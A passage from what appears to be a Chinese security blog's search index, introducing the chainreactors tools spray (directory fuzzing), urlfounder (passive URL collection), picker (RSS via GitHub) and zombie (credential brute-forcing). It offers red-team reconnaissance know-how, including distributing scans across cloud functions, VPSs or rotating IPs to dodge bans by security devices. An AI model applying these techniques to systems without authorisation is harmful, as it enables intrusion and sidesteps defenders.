<p>\u800c\u5728\u5907\u4efd\u6587\u4ef6\u7206\u7834\u4e2d, \u4f8b\u5982\u5e38\u89c1\u7684\u4e60\u60ef\u53ef\u80fd\u662f sitename.zip, \u6216\u8005vim\u7684\u4e34\u65f6\u6587\u4ef6 <code>~filename</code>, \u4e5f\u5b8c\u5168\u5bf9\u5e94\u7684hashcat\u4e2d\u7684rule-base .</p> <p>\u8fd8\u6709\u6ca1\u6709\u66f4\u591a\u7684\u529e\u6cd5? </p> <p>\u7b54\u6848\u662f\u80af\u5b9a, \u4e0e\u6211\u6709\u7c7b\u4f3c\u60f3\u6cd5\u7684\u4eba\u4e0d\u5c11, \u6709\u8bb8\u591a\u5148\u884c\u8005\u4e5f\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5b57\u5178\u751f\u6210\u7684\u65b9\u6848. \u4f8b\u5982:</p> <ul> <li>https://github.com/musana/fuzzuli \u6839\u636e\u57df\u540d\u751f\u6210\u5907\u4efd\u6587\u4ef6\u5b57\u5178</li> <li>https://github.com/tomnomnom/waybackurls \u6839\u636e\u5df2\u77e5\u7684url\u751f\u6210\u65b0\u7684url</li> <li>https://github.com/Josue87/gotator \u4e0ewaybackurls\u65b9\u6cd5\u7c7b\u4f3c, \u6839\u636e\u5173\u952e\u5b57\u53bb\u7ec4\u5408\u5b50\u57df\u540d</li> <li>https://github.com/tomnomnom/unfurl \u6839\u636e\u90e8\u5206\u5df2\u77e5\u4fe1\u606f\u751f\u6210\u5b57\u5178</li> </ul> <p>\u6709\u4e00\u4e9b\u662f\u7528\u6765\u751f\u6210\u5b50\u57df\u540d\u5b57\u5178\u7684,  \u4e0d\u8fc7\u601d\u8def\u5927\u540c\u5c0f\u5f02. \u90fd\u662f\u901a\u8fc7\u90e8\u5206\u5df2\u77e5\u6570\u636e\u8fdb\u884c\u5404\u79cd\u65b9\u5f0f\u7684\u7ec4\u5408\u62fc\u63a5. \u5b9e\u73b0\u6d3e\u751f\u51fa\u4e00\u7cfb\u5217\u76f8\u5173\u8054\u7684\u5b57\u5178. </p> <p>\u5f53\u7136\u8fd9\u53ea\u662f\u4e00\u5c0f\u90e8\u5206\u5b57\u5178\u751f\u6210\u7684\u73a9\u6cd5, \u8fd8\u6709\u66f4\u52a0\u82b1\u91cc\u80e1\u54e8\u7684\u65b9\u5f0f.</p> <p>\u5c0f\u7ed3: </p> <p>\u6f84\u6e05\u4e86\u79ef\u7d2f\u5b57\u5178\u7684\u65b9\u5f0f\u89e3\u51b3\u4e0d\u4e86URL\u7206\u7834\u95ee\u9898, \u800c\u751f\u6210\u5b57\u5178\u80fd\u7f13\u89e3\u4e00\u90e8\u5206\u95ee\u9898, \u4f46\u4e0d\u662f\u5168\u90e8.</p>"},{"location":"blog/2023/12/31/spray-introduce/#\u5982\u4f55\u5224\u65ad\u54ea\u4e9b\u76ee\u5f55\u6587\u4ef6\u662f\u6709\u6548\u7684","title":"\u5982\u4f55\u5224\u65ad\u54ea\u4e9b\u76ee\u5f55/\u6587\u4ef6\u662f\u6709\u6548\u7684?","text":"<p>\u8fd9\u540c\u6837\u662f\u4e00\u4e2a\u57fa\u7840\u9762\u8bd5\u4e2d\u90fd\u5f88\u96be\u95ee\u51fa\u7684\"\u7b80\u5355\"\u95ee\u9898, \u4f46\u4e0e\"\u4e3a\u4ec0\u4e48\u8981\u6536\u96c6url\"\u4e00\u6837\u6709\u975e\u5e38\u591a\u7684\u4e60\u4ee5\u4e3a\u5e38\u7684\u8bef\u4f1a. </p>"},{"location":"blog/2023/12/31/spray-introduce/#200\u7684\u76ee\u5f55\u662f\u6709\u6548\u7684\u5417","title":"200\u7684\u76ee\u5f55\u662f\u6709\u6548\u7684\u5417\uff1f","text":"<p>\u5f88\u591a\u626b\u63cf\u5668\u901a\u8fc7\u72b6\u6001\u7801\u53bb\u5224\u65adURL\u6709\u6548\u6027, \u4f8b\u5982dirsearch, dirmap\u7b49. \u4f46200\u9875\u9762\u6709\u975e\u5e38\u591a\u7684\u4f8b\u5916. \u4f8b\u5982</p> <ul> <li>\u67d0\u4e2aAPI\u901a\u8fc7json\u8fd4\u56de\u9519\u8bef\u4fe1\u606f, \u6240\u6709\u63a5\u53e3\u90fd\u662f200</li> <li>\u67d0\u4e2a404\u9875\u9762\u6dfb\u52a0\u4e86\u516c\u76ca\u4fe1\u606f, \u6240\u6709404\u9875\u9762\u90fd\u662f200</li> <li>\u67d0\u4e2a\u7f51\u7ad9\u901a\u8fc7js\u8c03\u6574\u5230404\u9875\u9762, \u6240\u6709\u8def\u7531\u90fd\u662f200</li> <li>......</li> </ul> <p>\u663e\u7136200\u9875\u9762\u4e0d\u4e00\u5b9a\u662f\u6709\u6548\u7684.</p>"},{"location":"blog/2023/12/31/spray-introduce/#404\u9875\u9762\u4e00\u5b9a\u662f\u65e0\u6548\u7684\u5417","title":"404\u9875\u9762\u4e00\u5b9a\u662f\u65e0\u6548\u7684\u5417?","text":"<p>\u5f53\u7136\u901a\u5e38\u60c5\u51b5\u4e0b\u662f, \u4f46\u4e5f\u6709\u5f88\u591a\u4f8b\u5916\u60c5\u51b5. \u4f8b\u5982:</p> <ul> <li>\u67d0\u4e2a\u9875\u9762\u9700\u8981\u9274\u6743, \u672a\u6388\u6743\u7684\u9875\u9762\u90fd\u8fd4\u56de\u4e86404</li> <li>\u67d0\u4e2aapi\u63a5\u53e3\u505a\u4e86\u5168\u5c40\u7684\u9519\u8bef\u5904\u7406, \u53c2\u6570\u4e0d\u5b58\u5728\u5219\u8fd4\u56de404</li> <li>\u547d\u4e2d\u4e86\u67d0\u4e2a\u53cd\u4ee3, \u8fd4\u56de\u4e86\u540e\u7aef\u7684\u67d0\u4e2a\u5730\u5740, \u4f46\u540e\u7aef\u670d\u52a1\u7684\u9996\u9875\u662f404 (\u5728\u597d\u51e0\u6b21\u7ea2\u84dd\u5bf9\u6297\u4e2d, \u627e\u5230\u4e86\u88ab\u53cb\u5546\u9057\u6f0f\u7684\u8fd9\u6837\u7684\u8d44\u4ea7)</li> <li>......</li> </ul> <p>\u7c7b\u4f3c\u7684\u95ee\u9898\u8fd8\u6709\u5f88\u591a, 400\u9875\u9762, 403\u9875\u9762, 405\u9875\u9762, 500\u9875\u9762\u7b49\u7b49\u7b49\u7b49, \u6bcf\u4e2a\u72b6\u6001\u7801\u90fd\u6709\u975e\u5e38\u591a\u7684\u5e94\u7528\u573a\u666f\u4e0e\u7ea6\u5b9a\u4fd7\u6210\u7684\u7ec6\u8282. </p>"},{"location":"blog/2023/12/31/spray-introduce/#\u5982\u4f55\u9ad8\u6548\u5224\u65ad\u6709\u6548\u76ee\u5f55","title":"\u5982\u4f55\u9ad8\u6548\u5224\u65ad\u6709\u6548\u76ee\u5f55?","text":"<p>\u5f00\u6e90\u4e16\u754c\u662f\u6709\u4e00\u4e9b\u5b9e\u73b0\u7684, \u4f8b\u5982ffuf\u7684\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u89c4\u5219\u4e0eferoxbuster\u7684page similarity.</p> <p>ffuf\u53ef\u4ee5\u901a\u8fc7\u590d\u6742\u7684\u53c2\u6570\u53bb\u6839\u636e\u76ee\u6807\u7f51\u7ad9\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u89c4\u5219,  \u5b9e\u73b0\u5bf9\u6709\u4ef7\u503c\u76ee\u5f55\u7684\u8fc7\u6ee4. \u7f3a\u70b9\u662f\u914d\u7f6e\u9ebb\u70e6, \u65e0\u6cd5\u81ea\u52a8\u5316</p> <p>feroxbuster\u5219\u901a\u8fc7page similarity(\u7f51\u9875\u76f8\u4f3c\u5ea6)\u5b9e\u73b0\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u81ea\u52a8\u5316\u8fc7\u6ee4, \u7f3a\u70b9\u662f\u76f8\u4f3c\u5ea6\u9700\u8981\u624b\u52a8\u914d\u7f6e, \u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\u81ea\u52a8\u5316, \u4f46\u4e5f\u4e0d\u591f\u7075\u6d3b, \u5e76\u5b58\u5728\u8f83\u591a\u7684\u8bef\u62a5\u4e0e\u6f0f\u62a5.</p> <p>\u8981\u505a\u5230\u81ea\u52a8\u7684\u53bb\u5224\u65ad\u6709\u6548\u76ee\u5f55, \u786e\u5b9e\u662f\u4e00\u4ef6\u6bd4\u8f83\u56f0\u96be\u7684\u4e8b\u60c5, \u771f\u5b9e\u65f6\u95f4\u7684\u7279\u4f8b\u592a\u591a, \u5c31\u7b97\u8bf7\u6765\u4e86ChatGPT \u4e5f\u96be\u8bf4\u80fd\u5224\u65ad\u6bcf\u4e2a\u8fd4\u56de\u5305\u662f\u5426\u6709\u6548. </p> <p>\u56e0\u6b64, \u6211\u4eec\u53ea\u80fd\u5728\u51c6\u786e\u7387\u4e0e\u6548\u7387\u4e4b\u95f4\u53d6\u820d, \u5f97\u5230\u4e00\u4e2a\u5c3d\u53ef\u80fd\u5b8c\u7f8e\u7684\u65b9\u6848.  </p> <p>\u6211\u4eec\u603b\u7ed3\u4e86\u524d\u4eba\u7684\u4ee3\u7801\u4e0e\u81ea\u8eab\u7684\u7ecf\u9a8c, \u91c7\u7528\u4e86\u901a\u8fc7\u5148\u83b7\u53d6\u57fa\u51c6\u503c, \u518d\u5c06\u540e\u7eed\u8bf7\u6c42\u4e0e\u57fa\u51c6\u503c\u5bf9\u6bd4, \u5e76\u901a\u8fc7\u5927\u91cf\u7684\u7ecf\u9a8c\u516c\u5f0f\u53bb\u4fee\u6b63\u4e00\u4e9b\u7279\u6b8a\u7684case. \u5b9e\u73b0\u4e86\u4e00\u5957\u975e\u5e38\u590d\u6742\u7684\u5224\u65ad\u673a\u5236. \u73b0\u5728\u8fd9\u5957\u673a\u5236\u7ecf\u8fc7\u4e86\u534a\u5e74\u7684\u6d4b\u8bd5, \u8fd0\u4f5c\u826f\u597d. \u867d\u4e0d\u514d\u65f6\u4e0d\u65f6\u51fa\u73b0\u4e00\u4e9b\u4f8b\u5916, \u4f46\u4e5f\u80fd\u901a\u8fc7\u826f\u597d\u7684debug\u4fe1\u606f\u53bb\u4eba\u5de5\u8c03\u6574. </p> <p>\u6211\u4eec\u5c06\u8fd9\u4e00\u5957\u7ecf\u9a8c\u81ea\u52a8\u5316, \u5199\u6210\u4e86\u4e0b\u4e00\u4ee3\u76ee\u5f55fuzz\u5de5\u5177 --- spray </p> <p>\u9650\u4e8e\u7bc7\u5e45, \u8fd0\u4f5c\u673a\u5236\u4e0d\u5728\u8fd9\u91cc\u7f00\u8ff0. \u53ef\u4ee5\u53c2\u89c1wiki\u4e2d\u7684\u7ec6\u8282\u4e00\u7ae0: https://chainreactors.github.io/wiki/spray/detail/#_2 . </p> <p>\u793a\u4f8b:</p> <p></p>"},{"location":"blog/2023/12/31/spray-introduce/#\u6279\u91cf\u81ea\u52a8\u5316\u7206\u7834","title":"\u6279\u91cf\u81ea\u52a8\u5316\u7206\u7834","text":"<p>\u5728\u76ee\u5f55\u7206\u7834\u4e2d\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u975e\u5e38\u91cd\u8981. \u90a3\u5c31\u662f\u540c\u65f6\u5bf9\u591a\u4e2a\u7f51\u7ad9\u7684\u7206\u7834. </p> <p>\u9650\u4e8effuf/feroxbuster\u90fd\u9700\u8981\u901a\u8fc7\u624b\u52a8\u914d\u7f6e\u624d\u80fd\u5b9e\u73b0\u4e00\u5b9a\u7a0b\u5ea6\u7684\u667a\u80fd\u8fc7\u6ee4. \u56e0\u6b64\u5f88\u96be\u54ea\u6765\u540c\u65f6\u7206\u7834\u4e00\u6279\u7f51\u7ad9. \u800c\u66f4\u8001\u7684\u5de5\u5177\u4e0d\u662f\u4e0d\u652f\u6301, \u5c31\u662f\u652f\u6301\u7684\u6709\u9650.</p> <p>\u8981\u89e3\u51b3\u6279\u91cf\u81ea\u52a8\u5316\u7206\u7834, \u5173\u952e\u70b9\u5176\u5b9e\u5728\"\u5982\u4f55\u9ad8\u6548\u5224\u65ad\u6709\u6548\u76ee\u5f55\"\u4e0a, \u53ea\u8981\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u5e76\u4e14\u4e0d\u9700\u8981\u989d\u5916\u624b\u52a8\u914d\u7f6e, \u90a3\u4e48\u6279\u91cf\u7684\u81ea\u52a8\u5316\u7206\u7834\u95ee\u9898\u5c31\u8fce\u5203\u800c\u89e3\u4e86. </p> <p>\u9664\u6b64\u4e4b\u5916, \u591a\u670d\u52a1\u5668\u534f\u540c\u7684\u5206\u5e03\u5f0f\u7206\u7834\u95ee\u9898\u4e5f\u5c06\u662f\u5173\u952e\u56e0\u7d20. \u56e0\u4e3a\u4efb\u4f55\u9ad8\u5e76\u53d1\u884c\u4e3a, \u90fd\u7279\u522b\u5bb9\u6613\u88ab\u5b89\u5168\u8bbe\u5907ban\u6389. \u4e3a\u4e86\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236, \u9664\u4e86\u5206\u5e03\u5f0f\u4e4b\u5916\u6ca1\u6709\u5176\u4ed6\u529e\u6cd5. </p> <p>\u5206\u5e03\u5f0f\u7684\u65b9\u6848\u6709\u5f88\u591a, \u4e91\u51fd\u6570(\u5b58\u5728\u76d1\u7ba1, \u6709\u53ef\u80fdban\u8d26\u53f7), \u6279\u91cf\u8d2d\u4e70vps, \u6362\u7ed1IP\u7b49\u7b49.</p> <p>spray\u81ea\u5e26\u4e86\u88abban\u5224\u65ad, \u88abban\u540e\u80fd\u6536\u96c6\u65ad\u70b9\u6570\u636e\u505c\u6b62\u4efb\u52a1, \u7136\u540e\u4ea4\u7ed9\u5176\u4ed6\u670d\u52a1\u5668\u65ad\u70b9\u7eed\u4f20\u7ee7\u7eed\u4efb\u52a1.</p>"},{"location":"blog/2023/12/31/spray-introduce/#\u88ab\u52a8\u6536\u96c6url","title":"\u88ab\u52a8\u6536\u96c6URL","text":"<p>\u4e0a\u9762\u8ba8\u8bba\u7684\u90fd\u662f\u4e3b\u52a8\u7206\u7834URL\u7684\u95ee\u9898, \u4e0e\u5b50\u57df\u540d\u7684\u6536\u96c6\u7c7b\u4f3c. \u9664\u4e86\u4e3b\u52a8\u7206\u7834\u8fd8\u53ef\u4ee5\u88ab\u52a8\u6536\u96c6. </p> <p>\u5b50\u57df\u540d\u6536\u96c6\u7684\u6280\u672f\u5df2\u7ecf\u975e\u5e38\u6210\u719f, \u4e3b\u52a8\u7206\u7834, api\u67e5\u8be2\u90fd\u6709\u975e\u5e38\u5145\u8db3\u7684\u5de5\u5177\u53ef\u4ee5\u53c2\u8003. \u4f46URL\u76ee\u524d\u5f00\u6e90\u7684\u5de5\u5177\u90fd\u662f\u4e3b\u52a8\u7206\u7834\u7684, \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u6211\u4eec\u53c2\u8003\u4e86subfinder\u7684\u4ee3\u7801, fork\u5e76\u4fee\u6539\u4e86\u4e00\u4e2a\u901a\u8fc7api\u88ab\u52a8\u6536\u96c6URL\u7684\u5de5\u5177. </p> <p>github\u5730\u5740: https://github.com/chainreactors/urlfounder</p> <p>\u8fd9\u4e2a\u5de5\u5177\u7684\u5404\u65b9\u9762\u90fd\u4e0esubfinder\u4e00\u81f4. \u6211\u4eec\u6cbf\u7528\u4e86subfinder\u7684\u5927\u90e8\u5206\u4ee3\u7801, \u5728\u4e00\u4e9burl\u4e0e\u5b50\u57df\u540d\u7684\u5dee\u5f02\u4e0a\u505a\u4e86\u7279\u6b8a\u4f18\u5316. </p> <p>\u4f8b\u5982\u6536\u96c6\u5b8c\u540e\u53ef\u4ee5\u901a\u8fc7-active -title -sc\u5feb\u6377\u83b7\u53d6\u72b6\u6001\u7801\u4e0etitle.</p> <p></p>"},{"location":"blog/2023/12/31/spray-introduce/#end","title":"End","text":"<p>\u6211\u4eec\u4ece\u4e3b\u52a8\u4e0e\u88ab\u52a8\u4e24\u4e2a\u65b9\u9762\u6784\u5efa\u4e00\u5957\u5168\u65b0\u7684url\u6536\u96c6\u624b\u6bb5. \u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u6d4b\u8bd5\u540e\u6210\u4e3a\u7b2c\u4e8c\u4e2a\u4e0e\u7b2c\u4e09\u4e2a\u5f00\u6e90\u7684\u5de5\u4ef6, \u56e0\u4e3a\u6d4b\u8bd5\u7684\u4eba\u6570\u6709\u9650, \u6709\u4e9b\u53c2\u6570\u7684\u8054\u52a8\u53ef\u80fd\u4e0d\u5c11bug, \u5982\u679c\u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u4e86bug, \u6b22\u8fce\u63d0\u4f9bissue\u53cd\u9988.  </p> <p>\u56e0\u4e3agogo\u53d1\u5e03\u65f6\u7684\u4ecb\u7ecd\u6587\u7ae0\u592a\u8fc7\u751f\u786c, \u56e0\u6b64\u672c\u6587\u5c1d\u8bd5\u5bf9urlfounder\u4e0espray\u91c7\u7528\u95ee\u7b54\u7684\u65b9\u5f0f\u4ecb\u7ecd. \u5b9e\u9645\u4e0a\u6ca1\u6709\u5b8c\u5168\u6db5\u76d6\u5b83\u4eec\u7684\u80fd\u529b\u8303\u56f4, \u7279\u522b\u662fspray, \u6d89\u53ca\u4e86\u975e\u5e38\u591a\u7684\u529f\u80fd\u7ed9\u7528\u6237\u81ea\u884c\u63a2\u7d22, \u5f53\u7136\u4e5f\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684\u6587\u6863\u4ee5\u4f9b\u53c2\u8003. </p> <p>\u76f8\u4fe1\u4e24\u4e2a\u65b0\u7684\u5de5\u5177\u80fd\u4e30\u5bcc\u4f60\u4fe1\u606f\u6536\u96c6\u7684\u624b\u6bb5.</p>"},{"location":"blog/2022/11/20/picker-introduce/","title":"\u5229\u7528github\u5b9e\u73b0rss\u7684\u534f\u4f5c, \u8ba2\u9605, \u7cbe\u9009\u4e0e\u7ba1\u7406","text":""},{"location":"blog/2022/11/20/picker-introduce/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u5728\u5f00\u59cb\u786c\u6838\u7684\u5185\u5bb9\u524d, \u5148\u4ecb\u7ecd\u4e00\u4e2a\u7a7a\u95f2\u65f6\u5199\u7684\u5c0f\u73a9\u5177. \u57fa\u4e8egithub\u7684rss\u534f\u4f5c\u7ba1\u7406\u5de5\u5177.</p> <p>repo: https://github.com/chainreactors/picker</p>"},{"location":"blog/2022/11/20/picker-introduce/#picker","title":"picker","text":"<p>\u5728\u8fc7\u53bb\u51e0\u5e74\u95f4, \u5927\u591a\u6570\u65f6\u95f4\u6211\u90fd\u5728\u4f7f\u7528irreader. http://irreader.fatecore.com/</p> <p>\u4f7f\u7528\u4f53\u9a8c\u8fd8\u7b97\u4e0d\u9519, \u4f46\u662f\u4e5f\u4ec5\u9650\u4e8e\u4e00\u4e2a\u9605\u8bfb\u5668, \u5e76\u4e0d\u80fd\u4fdd\u5b58\u6587\u7ae0\u5230\u672c\u5730, \u4e5f\u4e0d\u80fd\u8fdb\u884c\u4e00\u4e9b\u590d\u6742\u7684\u63a8\u9001\u548c\u7ba1\u7406.</p> <p>\u76f4\u5230\u6709\u4e00\u5929\u6211\u770b\u5230\u4e86 https://github.com/VulnTotal-Team/yarb , \u624d\u610f\u8bc6\u5230, \u5176\u5b9egithub\u624d\u662frss\u7ba1\u7406\u6700\u597d\u7684\u5de5\u5177.</p> <p>\u4e3a\u6b64, \u6211\u5bf9yarb\u8fdb\u884c\u5927\u5200\u9614\u65a7\u7684\u6539\u52a8, \u5e76\u4f7f\u7528github action \u5b9e\u73b0serverless\u7684\u63a8\u9001\u4ee5\u53ca issue\u4e0eissue tag\u8fdb\u884c\u7ba1\u7406.</p> <p>\u5bf9\u4e8erss , \u6211\u8ba4\u4e3a\u6700\u6025\u8feb\u7684\u529f\u80fd\u662f:</p> <ol> <li>\u6293\u53d6\u6570\u636e\u5e76\u6301\u4e45\u5316\u4fdd\u5b58</li> <li>\u7cbe\u9009\u4e0e\u5206\u7c7b</li> <li>\u53ef\u534f\u4f5c</li> <li>\u53ef\u641c\u7d22</li> </ol> <p>\u6070\u597d, \u8fd9\u4e9b\u529f\u80fd, github\u90fd\u80fd\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0</p>"},{"location":"blog/2022/11/20/picker-introduce/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":"<p>\u8fd9\u4e2a\u9879\u76ee\u5df2\u7ecf\u8dd1\u4e86\u4e00\u6bb5\u65f6\u95f4, \u8fd8\u6709\u4e00\u4e9b\u9700\u6c42\u6ca1\u5b9e\u73b0, \u4e0d\u8fc7\u5927\u81f4\u5df2\u7ecf\u53ef\u7528.</p>"},{"location":"blog/2022/11/20/picker-introduce/#\u6293\u53d6","title":"\u6293\u53d6","text":"<p>\u70b9\u5230picker\u7684\u4ed3\u5e93\u4e2d, \u5c31\u53ef\u4ee5\u53d1\u73b0\u91cc\u9762\u6709\u975e\u5e38\u591a\u7684issue</p> <p></p> <p>\u8fd9\u4e9b\u5c31\u662f\u6bcf\u5929github action\u8fd0\u884c\u722c\u53d6\u7684\u7ed3\u679c.</p> <p>\u6bcf\u5929\u7684\u6240\u6709\u6587\u7ae0\u4f1a\u65b0\u5efa\u4e00\u4e2adaily\u6807\u7b7e\u7684issue, \u5185\u5bb9\u662ftasklist\u5217\u8868.</p> <p></p> <p>\u5982\u679c\u5df2\u8bfb, \u5c31\u70b9\u4e00\u4e0b\u6846\u6846\u6253\u4e2a\u52fe, \u8fd9\u662fgithub\u7684tasklist\u529f\u80fd, \u80fd\u81ea\u52a8\u4fee\u6539md.</p> <p>\u5728issue\u9875\u9762\u8fd8\u80fd\u770b\u5230\u4eca\u65e5\u672a\u8bfb\u7684\u6570\u91cf</p> <p></p>"},{"location":"blog/2022/11/20/picker-introduce/#\u7cbe\u9009\u4e0e\u534f\u4f5c","title":"\u7cbe\u9009\u4e0e\u534f\u4f5c","text":"<p>\u5982\u679c\u6587\u7ae0\u503c\u5f97\u534f\u4f5c\u5c0f\u56e2\u4f53\u5185\u7684\u5176\u4ed6\u4eba\u9605\u8bfb, \u5219\u53ef\u4ee5\u628a\u9f20\u6807\u653e\u5230\u94fe\u63a5\u4e0a\u8fc7\u4e00\u4f1a\u513f, \u5c31\u80fd\u770b\u5230\u8fd9\u4e2a\u6309\u94ae<code>open convert to issue in current tab</code>.</p> <p></p> <p>\u5355\u51fb,\u6309\u94ae\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2aissue,  \u7136\u540egithub action \u673a\u5668\u4eba\u5c31\u4f1a\u88ab\u89e6\u53d1\u76f8\u5173\u4e8b\u4ef6, \u4fee\u6539\u6807\u9898, \u5185\u5bb9, \u6253\u8d4ftag, \u63a8\u9001\u7b49\u64cd\u4f5c.</p> <p></p> <p>\u540c\u65f6\u63a8\u9001\u673a\u5668\u4eba\u4e5f\u4f1a\u8fdb\u884c\u63a8\u9001\u5230\u9489\u9489(\u5f53\u524d\u53ea\u652f\u6301\u9489\u9489).</p> <p>\u53ef\u4ee5\u770b\u5230, \u6709pick\u4e0ejava\u6807\u7b7e,  \u5176\u4ed6pick\u6807\u7b7e\u662fbot\u81ea\u52a8\u6dfb\u52a0\u7684, \u800cJAVA\u6807\u7b7e\u662f\u6211\u624b\u52a8\u6dfb\u52a0\u7684.</p> <p>\u8fd9\u4e2a\u6807\u7b7e\u662f\u53ef\u4ee5\u5728issue\u4e2d\u88ab\u641c\u7d22\u5230\u7684. \u901a\u8fc7issue\u7684\u641c\u7d22\u8bed\u6cd5, \u53ef\u4ee5\u5feb\u901f\u8fc7\u6ee4\u51fa\u60f3\u8981\u7684\u6587\u7ae0.</p> <p>\u800c\u66f4\u5173\u952e\u7684, issue\u53ef\u4ee5\u5bf9\u5185\u5bb9\u8fdb\u884c\u641c\u7d22, \u8fd9\u6837\u5c31\u505a\u5230\u4e86\u5728\u65e0\u670d\u52a1\u5668\u7684\u60c5\u51b5\u4e0b, \u5bf9\u6587\u7ae0\u6807\u9898\u8fdb\u884c\u6301\u4e45\u5316\u4fdd\u5b58\u4e0e\u5206\u7c7b.</p> <p>\u53ea\u6dfb\u52a0\u4e86\u51e0\u4e2agithub action, \u5c31\u5b9e\u73b0\u4e86\u8f83\u4e3a\u590d\u6742\u7684\u529f\u80fd, github\u5929\u751f\u5bf9\u8fd9\u79cd\u53bb\u4e2d\u5fc3\u5316, \u9700\u8981\u534f\u4f5c\u7684\u95ee\u9898\u4e0a\u5177\u6709\u4f18\u52bf.</p>"},{"location":"blog/2022/11/20/picker-introduce/#\u6587\u7ae0\u5185\u5bb9\u7684\u6301\u4e45\u5316\u4fdd\u5b58","title":"\u6587\u7ae0\u5185\u5bb9\u7684\u6301\u4e45\u5316\u4fdd\u5b58","text":"<p>\u8fd9\u4e00\u5757\u5355\u7eaf\u4f7f\u7528github\u4e0d\u592a\u65b9\u4fbf\u5b9e\u73b0, \u5982\u679c\u4fdd\u5b58\u5728repo\u4e2d, \u9879\u76ee\u4f1a\u53d8\u5f97\u590d\u6742\u4e0e\u81c3\u80bf, \u53ef\u80fd\u8fd8\u662f\u9700\u8981\u4e00\u4e2a\u722c\u866b\u914d\u5408issue\u5217\u8868\u8fdb\u884c\u722c\u53d6.</p> <p>\u540e\u7eed\u518d\u60f3\u529e\u6cd5\u4f18\u96c5\u7684\u89e3\u51b3\u81ea\u52a8\u5316\u6587\u7ae0\u79bb\u7ebf\u4fdd\u5b58\u7684\u95ee\u9898, \u5982\u679c\u6709\u76f8\u5173\u89e3\u51b3\u529e\u6cd5, \u8bf7\u544a\u8bc9\u6211, \u4e07\u5206\u611f\u8c22.</p>"},{"location":"blog/2022/11/20/picker-introduce/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>\u56de\u60f3\u8d77\u7b2c\u4e00\u6b21\u7f16\u5199\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee(\u6211\u7684\u6bd5\u4e1a\u8bbe\u8ba1)\u4e5f\u662f\u7c7b\u4f3c\u7684\u9700\u6c42, \u5f53\u65f6\u62ff\u7740python\u624b\u6413\u4e00\u4e2a\u4e00\u4e2a\u529f\u80fd\u70b9, \u800c\u73b0\u5728\u53ea\u9700\u8981\u51e0\u884cyaml\u914d\u7f6e, \u5373\u53ef\u5b8c\u6210\u6bd4\u4e4b\u524d\u78e8\u4e86\u5c0f\u534a\u4e2a\u6708\u8fd8\u590d\u6742\u7684\u529f\u80fd. \u80fd\u770b\u5230github\u5bf9\u751f\u4ea7\u529b\u7684\u63a8\u52a8, \u4e5f\u662f\u6211\u6253\u7b97\u5b9e\u73b0\u4e00\u5957\u5f00\u6e90\u7684ASM\u7684\u52a8\u529b\u4e4b\u4e00. \u5e0c\u671b\u672a\u6765\u80fd\u901a\u8fc7\u51e0\u884cyaml, \u5373\u53ef\u5b8c\u6210\u73b0\u5728\u7ea2\u961f\u4fe1\u606f\u6536\u96c6\u51e0\u5929\u7684\u7ed3\u679c.</p>"},{"location":"blog/2024/06/07/zombie-introduce/","title":"\u5730\u8868\u6700\u5f3a\u5927\u7684\u51ed\u8bc1\u7206\u7834\u5de5\u5177","text":""},{"location":"blog/2024/06/07/zombie-introduce/#overview","title":"Overview","text":"<p>zombie\u662fgogo\u8bbe\u8ba1\u4e4b\u521d\u5c31\u8bde\u751f\u7684\u4e00\u4e2a\u8ba1\u5212\uff0c\u4e2d\u95f4\u5199\u4e86\u597d\u51e0\u7248(\u65e9\u671f\u7248\u672c@PassingFoam)\uff0c\u6401\u7f6e\u4e86\u5feb\u4e00\u5e74\u3002\u6b63\u5de7\u6709\u51e0\u4e2a\u670b\u53cb\u4e00\u76f4\u5728\u5173\u6ce8\u8fd9\u4e2a\u5de5\u5177\uff0c\u624d\u628a\u5b83\u4ece\u5185\u90e8\u4f7f\u7528\u7684\u5de5\u5177\u53d8\u6210\u57fa\u672c\u53ef\u7528\u7684\u5de5\u5177\u3002\u867d\u7136\u62d6\u4e86\u4e00\u5e74\u591a\uff0c\u4f46\u5b83\u7edd\u5bf9\u662f\u76ee\u524d\u5730\u7403\u4e0a\u6700\u5f3a\u5927\u7684\u7206\u7834\u5de5\u5177\u3002</p> <p>zombie \u4ece1.0\u5c31public\u4e86\u3002\u4f46\u662f\u56e0\u4e3abug\u3001\u534f\u8bae\u652f\u6301\u3001\u7528\u6237\u4f53\u9a8c\u3001\u517c\u5bb9\u6027\u7b49\u5404\u79cd\u95ee\u9898\uff0c\u4e00\u76f4\u4e0d\u613f\u5199\u4e00\u7bc7\u4ecb\u7ecd\u5b83\u7684\u6587\u7ae0\u3002\u81f3\u4eca\u5be5\u5be5\u51e0\u5341\u4e2astar\uff0c\u4f30\u8ba1\u90fd\u662f\u957f\u671f\u5173\u6ce8\u7684\u5c0f\u4f19\u4f34\u3002</p> <p>\u5230\u524d\u51e0\u5929\u53d1\u5e03\u7684v1.1.6\uff0czombie\u5e94\u8be5\u52c9\u5f3a\u53ef\u4ee5\u51fa\u6765\u89c1\u4eba\u4e86\u3002\u4e0egogo\u4ee5\u53ca\u4e4b\u524d\u7684\u5176\u4ed6\u5de5\u5177\u540c\u6837\uff0czombie\u4e5f\u5c06\u662f\u4e00\u4e2a\u957f\u671f\u7ef4\u62a4\u7684\u9879\u76ee\uff0c\u4e5f\u662fchainreactors\u5de5\u4ef6\u5e93\u4e2d\u65b0\u7684\u4e00\u73af\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":"<p>\u672c\u6587\u5c06\u4e0d\u8d58\u8ff0zombie\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u8bf7\u89c1</p> 